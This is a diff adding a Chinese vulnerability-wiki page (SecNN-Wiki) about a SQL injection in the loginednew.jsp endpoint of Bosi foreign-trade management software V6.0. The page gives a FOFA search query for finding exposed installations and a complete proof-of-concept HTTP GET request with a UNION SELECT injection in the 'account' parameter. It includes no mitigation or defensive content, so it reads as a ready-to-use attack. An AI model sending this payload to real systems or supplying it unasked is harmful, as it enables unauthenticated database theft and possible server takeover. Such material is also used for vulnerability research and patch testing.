@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%8D%9A%E6%96%AF%E8%BD%AF%E4%BB%B6/%E5%8D%9A%E6%96%AF%E5%A4%96%E8%B4%B8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6loginednew.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>博斯外贸管理软件loginednew.jsp存在SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u535a\u65af\u5916\u8d38\u7ba1\u7406\u8f6f\u4ef6loginednew.jsp\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%8D%9A%E6%96%AF%E8%BD%AF%E4%BB%B6V6.0%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%8D%9A%E6%96%AF%E8%BD%AF%E4%BB%B6V6.0%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        博斯软件V6.0 存在 sql 注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E5%8D%9A%E6%96%AF%E5%A4%96%E8%B4%B8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6logined.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E5%8D%9A%E6%96%AF%E5%A4%96%E8%B4%B8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6logined.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        博斯外贸管理软件logined.jsp存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="loginednewjspsql">博斯外贸管理软件loginednew.jsp存在SQL注入漏洞<a class="headerlink" href="#loginednewjspsql" title="Permanent link">&para;</a></h1>
+<p>博斯外贸管理软件V6.0 loginednew.jsp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">title</span><span class="o">=</span><span class="s2">&quot;欢迎使用 博斯软件&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">GET</span><span class="w"> </span><span class="o">/</span><span class="nx">loginednew</span><span class="p">.</span><span class="nx">jsp</span><span class="o">?</span><span class="nx">welcome</span><span class="o">=%</span><span class="nx">BB</span><span class="o">%</span><span class="nx">B6</span><span class="o">%</span><span class="nx">D3</span><span class="o">%</span><span class="nx">AD</span><span class="o">%</span><span class="nx">CA</span><span class="o">%</span><span class="nx">B9</span><span class="o">%</span><span class="nx">D3</span><span class="o">%</span><span class="nx">C3</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="nx">B2</span><span class="o">%</span><span class="nx">A9</span><span class="o">%</span><span class="nx">CB</span><span class="o">%</span><span class="nx">B9</span><span class="o">%</span><span class="nx">C8</span><span class="o">%</span><span class="nx">ED</span><span class="o">%</span><span class="nx">BC</span><span class="o">%</span><span class="nx">FEV6</span><span class="mf">.0</span><span class="p">(</span><span class="mf">20110701</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">systemname</span><span class="o">=</span><span class="nx">BS</span><span class="o">&amp;</span><span class="nx">account</span><span class="o">=</span><span class="mf">1</span><span class="o">%</span><span class="mf">27</span><span class="o">+</span><span class="nx">UNION</span><span class="o">+</span><span class="nx">ALL</span><span class="o">+</span><span class="nx">SELECT</span><span class="o">+</span><span class="nx">NULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CCHAR</span><span class="o">%</span><span class="mf">28113</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28107</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28118</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28112</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28113</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28117</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28115</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28111</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28109</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28106</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2887</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28103</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2888</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28113</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2890</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28117</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2874</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28101</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28117</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28118</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28113</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2879</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2883</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2886</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28104</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2868</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2889</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28107</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2874</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2887</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2871</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28115</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28121</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2873</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28114</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2882</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2866</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28115</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2882</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2872</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28117</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28106</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28121</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">2880</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28117</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28113</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28112</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28120</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28120</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">BCHAR</span><span class="o">%</span><span class="mf">28113</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">--+</span><span class="nx">EqLf</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="mf">1</span><span class="o">&amp;</span><span class="nx">val</span><span class="o">=</span><span class="mo">0000</span><span class="o">&amp;</span><span class="nx">availHeight</span><span class="o">=</span><span class="mf">834</span><span class="o">&amp;</span><span class="nx">Safari</span><span class="o">=</span><span class="nx">Y</span><span class="o">&amp;</span><span class="nx">loginurl</span><span class="o">=</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="nx">Win64</span><span class="p">;</span><span class="w"> </span><span class="nx">x64</span><span class="p">)</span><span class="w"> </span><span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">Gecko</span><span class="p">)</span><span class="w"> </span><span class="nx">Chrome</span><span class="o">/</span><span class="mf">131.0.0.0</span><span class="w"> </span><span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">avif</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Connection</span><span class="o">:</span><span class="w"> </span><span class="nx">keep</span><span class="o">-</span><span class="nx">alive</span>
+</code></pre></div>
+<p><img alt="image-20241227215249023" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272152097.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%8D%9A%E6%96%AF%E8%BD%AF%E4%BB%B6V6.0%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%8D%9A%E6%96%AF%E8%BD%AF%E4%BB%B6V6.0%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        博斯软件V6.0 存在 sql 注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E5%8D%9A%E6%96%AF%E5%A4%96%E8%B4%B8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6logined.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E5%8D%9A%E6%96%AF%E5%A4%96%E8%B4%B8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6logined.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        博斯外贸管理软件logined.jsp存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
